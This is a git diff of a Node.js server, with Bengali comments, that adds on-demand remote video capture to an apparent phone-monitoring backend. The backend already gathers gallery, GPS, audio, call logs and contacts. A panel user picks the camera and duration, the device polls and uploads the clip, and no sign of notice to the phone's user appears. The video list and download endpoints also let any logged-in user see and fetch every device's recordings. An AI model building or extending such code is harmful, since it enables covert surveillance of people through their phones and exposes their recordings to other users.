@@ -33,6 +33,20 @@ const audioStorage = multer.diskStorage({
 });
 const uploadAudio = multer({ storage: audioStorage, limits: { fileSize: 50 * 1024 * 1024 } }); // 50MB
 
+// ভিডিও আপলোড স্টোরেজ (আলাদা ফোল্ডার)
+const videoStorage = multer.diskStorage({
+  destination: (req, file, cb) => {
+    const dir = path.join(__dirname, 'uploads', 'video');
+    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
+    cb(null, dir);
+  },
+  filename: (req, file, cb) => {
+    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
+    cb(null, 'video-' + uniqueSuffix + path.extname(file.originalname));
+  }
+});
+const uploadVideo = multer({ storage: videoStorage, limits: { fileSize: 100 * 1024 * 1024 } }); // 100MB
+
 app.use(
   session({
     store: new pgSession({ pool, tableName: "user_sessions", createTableIfMissing: true }),
@@ -142,8 +156,9 @@ const galleryData = new Map();
 const galleryRequestFlags = new Map();
 const gpsRequestFlags = new Map();
 const audioRequestFlags = new Map();
-const callLogsData = new Map();   // নতুন
-const contactsData = new Map();   // নতুন
+const videoRequestFlags = new Map();
+const callLogsData = new Map();
+const contactsData = new Map();
 
 app.post("/api/device-state", async (req, res) => {
   try {
@@ -391,6 +406,75 @@ app.get("/api/audio/download/:filename", requireLogin, async (req, res) => {
   const filename = req.params.filename;
   const safeFilename = path.basename(filename);
   const filePath = path.join(__dirname, 'uploads', 'audio', safeFilename);
+  if (!fs.existsSync(filePath)) return res.status(404).json({ error: "File not found" });
+  res.download(filePath);
+});
+
+// ================= VIDEO RECORDING =================
+app.post("/api/video/request", requireLogin, async (req, res) => {
+  try {
+    const { deviceId, duration, cameraType } = req.body;
+    if (!deviceId) return res.status(400).json({ error: "deviceId required" });
+    if (!duration || isNaN(duration) || duration < 5 || duration > 30) {
+      return res.status(400).json({ error: "Duration must be between 5 and 30 seconds." });
+    }
+    const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
+    if (deviceRes.rows.length === 0 || deviceRes.rows[0].owner_user_id !== req.session.userId) {
+      return res.status(403).json({ error: "Not your device." });
+    }
+    videoRequestFlags.set(deviceId, { requested: true, duration: Math.floor(duration), cameraType: cameraType || 1 });
+    res.json({ success: true, requestedDuration: duration, cameraType: cameraType || 1 });
+  } catch (e) { console.error(e); res.status(500).json({ error: "Video request failed" }); }
+});
+
+app.get("/api/video/request", async (req, res) => {
+  const { deviceId } = req.query;
+  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
+  const flag = videoRequestFlags.get(deviceId);
+  if (flag) {
+    videoRequestFlags.delete(deviceId);
+    res.json({ requested: true, duration: flag.duration, cameraType: flag.cameraType });
+  } else {
+    res.json({ requested: false });
+  }
+});
+
+app.post("/api/video/upload", uploadVideo.single("video"), async (req, res) => {
+  try {
+    const { deviceId, deviceToken } = req.body;
+    if (!deviceId || !deviceToken || !req.file) {
+      return res.status(400).json({ error: "deviceId, deviceToken and video file required" });
+    }
+    const deviceRes = await pool.query("SELECT device_token FROM devices WHERE device_id=$1", [deviceId]);
+    if (deviceRes.rows.length === 0 || deviceRes.rows[0].device_token !== deviceToken) {
+      fs.unlink(req.file.path, () => {});
+      return res.status(401).json({ error: "Invalid device token." });
+    }
+    res.json({ success: true, filePath: req.file.path });
+  } catch (e) {
+    console.error(e);
+    res.status(500).json({ error: "Video upload failed" });
+  }
+});
+
+app.get("/api/video/list", requireLogin, async (req, res) => {
+  const { deviceId } = req.query;
+  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
+  const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
+  if (deviceRes.rows.length === 0 || deviceRes.rows[0].owner_user_id !== req.session.userId) {
+    return res.status(403).json({ error: "Not your device." });
+  }
+  const dir = path.join(__dirname, 'uploads', 'video');
+  fs.readdir(dir, (err, files) => {
+    if (err) return res.status(500).json({ error: "Failed to list video files" });
+    res.json({ files });
+  });
+});
+
+app.get("/api/video/download/:filename", requireLogin, async (req, res) => {
+  const filename = req.params.filename;
+  const safeFilename = path.basename(filename);
+  const filePath = path.join(__dirname, 'uploads', 'video', safeFilename);
   if (!fs.existsSync(filePath)) return res.status(404).json({ error: "File not found" });
   res.download(filePath);
 });
